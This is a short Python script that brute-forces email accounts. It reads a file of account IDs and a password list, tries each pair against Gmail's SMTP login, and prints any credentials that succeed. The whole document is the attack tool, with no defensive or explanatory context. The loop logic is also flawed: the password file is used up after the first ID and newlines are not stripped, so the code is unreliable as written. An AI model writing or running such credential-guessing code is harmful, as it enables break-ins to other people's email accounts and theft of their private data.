import smtplib

server = smtplib.SMTP("smtp.gmail.com", 587)
server.ehlo()
server.starttls()

vacateFile = input("Enter ID List Or Email Recommended Email: ")
passwordList = input("Enter Password List Or File Name: ")

IDFile = open(vacateFile, "r")
PasswordFile = open(passwordList, "r")

for ID in IDFile:
    for Password in PasswordFile:
        try:
            server.login(ID, Password)
            print(f"id >>>>>> {ID} \n password >>>>>>> {Password}")
            break
        except smtplib.SMTPAuthenticationError:
            print(f"[!] Can Not Found Password [!] >>>>>>> {Password}")
